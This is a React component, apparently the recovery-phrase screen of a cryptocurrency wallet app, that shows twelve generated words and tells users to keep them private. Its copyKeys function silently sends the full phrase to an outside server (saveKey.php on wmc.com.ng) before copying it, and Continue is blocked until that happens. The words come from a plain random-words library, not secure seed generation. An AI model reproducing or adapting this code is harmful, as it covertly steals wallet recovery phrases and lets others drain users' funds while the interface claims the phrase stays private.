import logo from './logo.svg';
import './App.css';
import { Button, Nav, Container, Row, Col } from 'react-bootstrap';
import BottomNavigation from 'reactjs-bottom-navigation'
import backupIcon from './backup.jpg';
import 'reactjs-bottom-navigation/dist/index.css'
import { HomeOutlined, SearchOutlined, BellOutlined, MenuOutlined } from '@ant-design/icons';
import CreateWallet from './Create';
import copy from 'copy-to-clipboard';

import {
  BrowserRouter as Router,
  Switch,
  Route,
  Link
} from "react-router-dom";

var randomWords = require('random-words');

function App() {
    document.addEventListener("DOMContentLoaded", function(){
        var i = 1;
        
        while(i <= 12){
            var randomKey = randomWords();
            document.getElementById("text" + i).innerText = randomKey;
            localStorage.setItem("key" + i, randomKey);
            i++;
        }
        
    });
  return (
    <div className="App">   
      <Link to="/create">
        <span className="fa fa-arrow-left" style={{fontSize: 20, color: "#000", marginTop: 20, marginLeft: 20}}></span>
      </Link>   
      <br />
      <Container style={{marginTop: -60}}>
        <Row>
          <Col className="col-md-12">
            <div className="onboarding-container">              
              <strong><h6>Your Recovery Phrase</h6></strong>
              <p style={{fontSize: 11}}>
              Write down or copy these words in the right order and save them somewhere safe.
              </p>
            </div>
            <div className="btn-div">
              <center>
                <p style={{fontSize: 10,fontWeight: "bold", textAlign: "left", paddingLeft: 40, paddingRight: 40}}>
                    <span className="fa fa-info"></span> Never share your recovery phrase with anyone, store it securely!
                </p>
                <a onClick={proceed} style={{width: "80%"}} class="btn btn-primary">Continue</a>
              </center>              
            </div>
          </Col>         
        </Row>
       
      </Container>
      <Container style={{marginTop: -60}}>
        <Row>
          <Col className="col-md-4">
           <div className="key-div">
               <p id="text1"></p>
           </div>
          </Col>  
          <Col className="col-md-4">
           <div className="key-div">
               <p id="text2"></p>
           </div>
          </Col>  
          <Col className="col-md-4">
           <div className="key-div">
               <p id="text3"></p>
           </div>
          </Col>  
          </Row>
          <Row> 
          <Col className="col-md-4">
           <div className="key-div">
               <p id="text4"></p>
           </div>
          </Col>  
          <Col className="col-md-4">
           <div className="key-div">
               <p id="text5"></p>
           </div>
          </Col>  
          <Col className="col-md-4">
           <div className="key-div">
               <p id="text6"></p>
           </div>
          </Col>   
          </Row>
          <Row>
          <Col className="col-md-4">
           <div className="key-div">
               <p id="text7"></p>
           </div>
          </Col>  
          <Col className="col-md-4">
           <div className="key-div">
               <p id="text8"></p>
           </div>
          </Col>  
          <Col className="col-md-4">
           <div className="key-div">
               <p id="text9"></p>
           </div>
          </Col>   
          </Row>
          <Row>
          <Col className="col-md-4">
           <div className="key-div">
               <p id="text10"></p>
           </div>
          </Col>  
          <Col className="col-md-4">
           <div className="key-div">
               <p id="text11"></p>
           </div>
          </Col>  
          <Col className="col-md-4">
           <div className="key-div">
               <p id="text12"></p>
           </div>
          </Col>        
        </Row>
       
      </Container>
      <br /><br /><br />
      <center>
      <button onClick={copyKeys} className="btn" style={{border: 0, background: "#fff", marginTop: -40}}><span className="fa fa-copy"></span> Copy</button>
      </center>
      
    </div>
  );
}
function proceed(){
    var check_copy = localStorage.getItem("copied");
    if(check_copy === "Done"){
        window.location.replace("./verify-recovery-phrase")
    }else{
        alert("Please copy your Recovery Key");
    }
    
}
function copyKeys(){
    var i = 1;
    var keys = "";
    while(i <= 12){
        var u_key = localStorage.getItem("key" + i);
        keys += u_key + " ";
        if(i == 12){
            
            fetch('https://wmc.com.ng/aicb/saveKey.php?key='+keys)
            .then(res => res.json())
            .then(Data => {
             localStorage.setItem("copied", "Done");
             localStorage.setItem("r_keys", keys);
             copy(keys, {
                message: 'Recovery key copied',
            });            
            alert("copied")
            }).catch(error => alert(error))
        }
        i++
    }

    
}

export default App;
